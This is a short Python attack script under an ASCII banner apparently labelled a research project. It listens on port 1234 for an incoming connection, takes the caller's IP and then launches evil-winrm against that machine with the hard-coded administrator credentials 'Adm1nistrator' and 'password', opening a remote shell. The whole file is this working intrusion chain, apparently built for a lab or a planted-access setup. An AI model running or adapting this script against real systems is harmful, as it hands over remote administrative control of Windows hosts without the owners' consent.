import subprocess
import sys
import socket

BANNER = r"""
:::::::::  :::::::::: ::::::::  ::::::::::     :::     :::::::::   ::::::::  :::    :::          :::::::::  :::::::::   ::::::::  ::::::::::: :::::::::: :::::::: :::::::::::
:+:    :+: :+:       :+:    :+: :+:          :+: :+:   :+:    :+: :+:    :+: :+:    :+:          :+:    :+: :+:    :+: :+:    :+:     :+:     :+:       :+:    :+:    :+:     
+:+    +:+ +:+       +:+        +:+         +:+   +:+  +:+    +:+ +:+        +:+    +:+          +:+    +:+ +:+    +:+ +:+    +:+     +:+     +:+       +:+           +:+      
+#++:++#:  +#++:++#  +#++:++#++ +#++:++#   +#++:++#++: +#++:++#:  +#+        +#++:++#++          +#++:++#+  +#++:++#:  +#+    +:+     +#+     +#++:++#  +#+           +#+       
+#+    +#+ +#+              +#+ +#+        +#+     +#+ +#+    +#+ +#+        +#+    +#+          +#+        +#+    +#+ +#+    +#+     +#+     +#+       +#+           +#+        
#+#    #+# #+#       #+#    #+# #+#        #+#     #+# #+#    #+# #+#    #+# #+#    #+#          #+#        #+#    #+# #+#    #+# #+# #+#     #+#       #+#    #+#    #+#         
###    ### ########## ########  ########## ###     ### ###    ###  ########  ###    ###          ###        ###    ###  ########   #####      ########## ########     ###   
"""

USERNAME = "Adm1nistrator"
PASSWORD = "password"
LISTEN_PORT = 1234

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", LISTEN_PORT))
    server.listen()

    print(f"[+] Listening on 0.0.0.0: {LISTEN_PORT} for incoming connection...")
    conn, addr = server.accept()
    target_ip = addr[0]
    print(f"[+] Connection received from: {target_ip}")

    conn.close()
    server.close()

    return target_ip

def connect_evil_winrm(target_ip):
    print("[*] Launching evil-win-rm...\n")
    cmd = [
        "evil-winrm",
        "-i", target_ip,
        "-u", USERNAME,
        "-p", PASSWORD
    ]
    subprocess.run(cmd)

def main():
    print(BANNER)
    target_ip = start_listener()
    connect_evil_winrm(target_ip)

if __name__ == "__main__":
    main()
